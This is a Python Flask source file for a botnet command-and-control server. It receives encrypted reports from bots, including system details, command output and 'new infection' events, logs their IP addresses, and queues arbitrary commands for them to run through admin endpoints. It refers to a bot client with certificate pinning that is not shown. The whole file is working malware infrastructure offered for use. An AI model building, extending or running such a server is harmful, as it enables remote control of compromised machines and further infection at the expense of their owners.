# server.py
from flask import Flask, request, jsonify
from cryptography.fernet import Fernet, InvalidToken
import json
import hashlib
import datetime
import os

app = Flask(__name__)

# --- CONFIGURATION ---
# IMPORTANT: This key MUST be the same as the one used by your bot_agent.py client.
# You should generate this once on the server and then distribute it securely to all your bots.
# For demonstration purposes, you can generate a key like this: Fernet.generate_key().decode()
# Then copy that exact string into your bot_agent.py's KEY variable.
# You must replace 'YOUR_VERY_SECRET_FERNET_KEY_HERE=' with your actual generated Fernet key.
# For a quick test, you can generate one and paste it here: Fernet.generate_key().decode()
FERNET_KEY_STR = os.getenv("FERNET_KEY", b'YOUR_VERY_SECRET_FERNET_KEY_HERE=').decode()

try:
    cipher_suite = Fernet(FERNET_KEY_STR.encode())
except Exception as e:
    print(f"Error initializing Fernet: {e}. Please ensure FERNET_KEY is a valid base64-encoded string.")
    print("Example: Fernet.generate_key().decode()")
    # In a real scenario, you might want to exit or handle this more gracefully.
    # For this demonstration, we'll continue, but be aware of the error.

# IMPORTANT: This hash must match the SHA256 hash of the server's SSL certificate.
# If you are not using HTTPS or a valid certificate, the client's `verify_certificate`
# function will fail. For local testing without HTTPS, you might need to disable
# certificate verification on the client side (e.g., set verify=False in requests
# and remove the call to verify_certificate).
CERT_PIN = b'your-pinned-certificate-hash' # Placeholder for client-side pinning

# In-memory storage for bots and commands
# bot_id -> {'last_seen': datetime_obj, 'system_info': {}, 'commands': [], 'ip': 'str'}
bots = {}

# --- HELPER FUNCTIONS ---
def decrypt_data(encrypted_data_str):
    """Déchiffre les données reçues du bot."""
    try:
        # The bot encodes its encrypted data before sending, so we decode it back to bytes
        # for Fernet to decrypt.
        return cipher_suite.decrypt(encrypted_data_str.encode()).decode()
    except InvalidToken:
        print("Invalid token received, possibly wrong key or corrupted data.")
        return None
    except Exception as e:
        print(f"Error decrypting data: {e}")
        return None

def encrypt_data(data_str):
    """Chiffre les données avant de les envoyer au bot."""
    # Note: This is not currently used by the server to send commands as commands are not encrypted by the server in this simple C2.
    # However, it's good practice to have if the server were to encrypt responses.
    return cipher_suite.encrypt(data_str.encode()).decode()

# --- API ENDPOINTS ---

@app.route('/report', methods=['POST'])
def receive_report():
    data = request.get_json()
    if not data:
        return jsonify({"status": "error", "message": "No JSON data provided"}), 400

    bot_id = data.get('bot_id')
    report_type = data.get('type')
    encrypted_payload = data.get('payload')
    source_ip = request.remote_addr # Get source IP of the bot

    if not all([bot_id, report_type, encrypted_payload]):
        return jsonify({"status": "error", "message": "Missing required fields"}), 400

    decrypted_payload = decrypt_data(encrypted_payload)
    if decrypted_payload is None:
        return jsonify({"status": "error", "message": "Failed to decrypt payload"}), 400

    try:
        payload_data = json.loads(decrypted_payload)
    except json.JSONDecodeError:
        return jsonify({"status": "error", "message": "Failed to decode decrypted JSON"}), 400

    if bot_id not in bots:
        bots[bot_id] = {'last_seen': None, 'system_info': {}, 'commands': [], 'ip': source_ip}

    bots[bot_id]['last_seen'] = datetime.datetime.now()
    bots[bot_id]['ip'] = source_ip

    print(f"[{datetime.datetime.now()}] Report from Bot {bot_id} (Type: {report_type}, IP: {source_ip})")
    if report_type == 'startup':
        print(f"  Startup message: {payload_data.get('message')}")
    elif report_type == 'system_info':
        bots[bot_id]['system_info'] = payload_data
        print(f"  System Info: {payload_data.get('hostname')}, OS: {payload_data.get('os_release', '')[:30]}...")
    elif report_type == 'command_result':
        print(f"  Command '{payload_data.get('command')}' result: {payload_data.get('result', '')[:100]}...")
    elif report_type == 'new_infection':
        print(f"  New infection reported: {payload_data}")
    elif report_type == 'infection_failed':
        print(f"  Infection failed: {payload_data}")


    return jsonify({"status": "success"}), 200

@app.route('/command', methods=['GET'])
def get_command():
    bot_id = request.args.get('id')
    if not bot_id:
        return jsonify({"status": "error", "message": "Bot ID is required"}), 400

    if bot_id in bots:
        # Return all pending commands and clear them
        commands_to_send = bots[bot_id]['commands']
        bots[bot_id]['commands'] = [] # Clear commands after sending
        print(f"[{datetime.datetime.now()}] Sending {len(commands_to_send)} commands to Bot {bot_id}")
        return jsonify(commands_to_send), 200
    else:
        return jsonify([]), 200 # No commands for unknown bot, or empty list

# --- ADMIN INTERFACE ENDPOINTS (for human interaction with the C2) ---

@app.route('/bots', methods=['GET'])
def list_bots():
    """Lists all registered bots and their details."""
    bot_list = []
    for bot_id, info in bots.items():
        bot_list.append({
            "bot_id": bot_id,
            "last_seen": info['last_seen'].strftime("%Y-%m-%d %H:%M:%S") if info['last_seen'] else "Never",
            "ip_address": info['ip'],
            "hostname": info['system_info'].get('hostname', 'N/A'),
            "os_release": info['system_info'].get('os_release', 'N/A').split('\n')[0],
            "pending_commands": len(info['commands'])
        })
    return jsonify(bot_list), 200

@app.route('/send_command', methods=['POST'])
def send_command_to_bot():
    data = request.get_json()
    if not data:
        return jsonify({"status": "error", "message": "No JSON data provided"}), 400

    bot_id = data.get('bot_id')
    command = data.get('command')

    if not all([bot_id, command]):
        return jsonify({"status": "error", "message": "Missing bot_id or command"}), 400

    if bot_id not in bots:
        return jsonify({"status": "error", "message": f"Bot {bot_id} not found"}), 404

    # The client expects a dict with a 'command' key, so we store it as such.
    bots[bot_id]['commands'].append({'command': command})
    print(f"[{datetime.datetime.now()}] Added command '{command}' for Bot {bot_id}")

    return jsonify({"status": "success", "message": f"Command added for bot {bot_id}"}), 200

# --- MAIN EXECUTION ---
if __name__ == '__main__':
    print("--- C2 Server Starting ---")
    print("NOTE: For security, the client expects HTTPS and certificate pinning.")
    print("      For local testing, you might need to:")
    print("      1. Disable `verify=True` in client's requests (or set to False).")
    print("      2. Remove client's `verify_certificate` calls.")
    print("      3. Update `C2_URL` in client to `http://127.0.0.1:5000` (or your server's IP/port).")
    print(f"Current Fernet Key (as string, copy this to client's KEY variable): {FERNET_KEY_STR}")

    # This is for local development. For production, use a WSGI server like Gunicorn + Nginx.
    # To run with HTTPS (required by client's verify=True and cert pinning):
    # app.run(host='0.0.0.0', port=443, ssl_context=('path/to/cert.pem', 'path/to/key.pem'))
    # For a simple test without HTTPS (but client will complain about SSL/cert pinning):
    app.run(host='0.0.0.0', port=5000, debug=True)
